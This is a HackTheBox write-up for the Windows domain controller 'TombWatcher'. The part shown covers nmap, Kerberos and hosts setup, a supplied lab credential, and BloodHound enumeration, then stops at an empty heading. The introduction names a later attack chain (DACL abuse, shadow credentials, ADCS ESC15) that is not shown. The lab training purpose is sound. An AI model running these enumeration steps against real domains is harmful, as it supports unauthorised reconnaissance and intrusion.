---
render_with_liquid: false
title: HackTheBox Writeup - TombWatcher
date: 2025-06-22 23:13:42 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, netexec, bloodhound-python, bloodhound, bloodhound-cli, ldeep, adcs, bloodyad, targeted-kerberoast, hashcat, impacket, pass-the-ticket, dacl-abuse, shadow-credentials, pass-the-cert, certipy, evil-winrm, ad-recyclebin, adcs-esc15]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f02ffc4-bf3e-4a15-9350-e0772596b1a7.png
    width: 640
    height: 480
---



`TombWatcher` is a medium difficulty machine, multiple **DACL abuse** chaining leads to shell as `john`, `john` is able to create shadow credential for `cert_admin` after restoring it from AD recycle bin, exploiting **ADCS ESC15** gains us WINRM access to domain controller as `Administrator`.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ pt init '10.10.11.72 DC01.tombwatcher.htb tombwatcher.htb DC01'
+-------------+--------+-------------+----------------------+
|   PROFILE   | STATUS |     IP      |        DOMAIN        |
+-------------+--------+-------------+----------------------+
| tombwatcher | on     | 10.10.11.72 | DC01.tombwatcher.htb |
| tombwatcher | on     | 10.10.11.72 | DC01                 |
| tombwatcher | on     | 10.10.11.72 | tombwatcher.htb      |
+-------------+--------+-------------+----------------------+
```

## Nmap

```bash
# Nmap 7.95 scan initiated Sun Jun 22 23:13:42 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49693,49694,49695,49714,49720,49739,50911, DC01.tombwatcher.htb
Nmap scan report for DC01.tombwatcher.htb (10.10.11.72)
Host is up, received user-set (0.080s latency).
Scanned at 2025-06-22 23:13:42 CST for 108s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-22 15:13:49Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-22T15:15:28+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-22T15:15:28+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-22T15:15:28+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-22T15:15:28+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49739/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50911/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 2925/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 59079/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-22T15:14:53
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: -1s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 22 23:15:30 2025 -- 1 IP address (1 host up) scanned in 107.72 seconds
```


# User Flag
---

## Auth as henry


### Setup AD environment

Check the domain controller name and domain name then add to hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ nxc smb $(pt get rhost) --generate-hosts-file .pt/hosts && cat .pt/hosts | sudo tee -a /etc/hosts
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
10.10.11.72     DC01.tombwatcher.htb tombwatcher.htb DC01
```

Sync time with domain controller

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ sudo ~/scripts/ad/sync_ntp.sh $(pt get ip)
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-06-22 15:59:59.119909 (+0800) +13069.114908 +/- 0.042470 10.10.11.72 s1 no-leap
CLOCK: time stepped by 13069.114908

Done syncing time with NTP server: 10.10.11.72
```

Configure kerberos

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ pt set rhost `cat .pt/hosts | awk '{print $2}' | tail -n1` && nxc smb -k $(pt get rhost) --generate-krb5-file .pt/krb5.conf && sudo cp .pt/krb5.conf /etc/krb5.conf
SMB         DC01.tombwatcher.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ cat /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = TOMBWATCHER.HTB

[realms]
    TOMBWATCHER.HTB = {
        kdc = dc01.tombwatcher.htb
        admin_server = dc01.tombwatcher.htb
        default_domain = tombwatcher.htb
    }

[domain_realm]
    .tombwatcher.htb = TOMBWATCHER.HTB
    tombwatcher.htb = TOMBWATCHER.HTB
```


### Assumed breach scenario

![](/assets/obsidian/c99f700128d7395c9851476c51ff11b3.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ creds-set 'henry' 'H3nry_987TGV!'
henry:H3nry_987TGV!
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ nxc smb $(pt get rhost) -k -u "$(pt get user)" -p "$(pt get pass)"
SMB         DC01.tombwatcher.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         DC01.tombwatcher.htb 445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
```


## Auth as Alfred


### Domain Enumeration


#### Bloodhound

Run collectors

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 24S
INFO: Compressing output into 20250622213453_bloodhound.zip
```

Start bloodhound community eddition

```bash
sudo docker-compose -f /opt/sectools/ad/bloodhound-ce/docker-compose.yml up
```


#### bhcli

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bhcli upload `ls -t *_bloodhound.zip | head -1`
INFO: Starting new file upload job...
INFO: Uploading file 20250622213453_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ TOMBWATCHER.HTB    │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │      10 │       7 │
│ Computer Accounts  │       2 │       2 │
│ Domain Admins      │       1 │       1 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       0 │       0 │
│ Groups             │      52 │         │
│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bhcli users -d "$(pt get domain)" --description
ADMINISTRATOR@TOMBWATCHER.HTB   Built-in account for administering the computer/domain
ALFRED@TOMBWATCHER.HTB
ANSIBLE_DEV$@TOMBWATCHER.HTB
ATTACKER@TOMBWATCHER.HTB
GUEST@TOMBWATCHER.HTB   Built-in account for guest access to the computer/domain
HENRY@TOMBWATCHER.HTB
JOHN@TOMBWATCHER.HTB
KRBTGT@TOMBWATCHER.HTB  Key Distribution Center Service Account
NT AUTHORITY@TOMBWATCHER.HTB
SAM@TOMBWATCHER.HTB

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bhcli audit -d "$(pt get domain)"
TOMBWATCHER.HTB
===============

[*] Interesting privileges for domain users or computers
    0 relations found

[*] Interesting privileges for guests
    0 relations found

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found
```

#### Ldeep

```bash
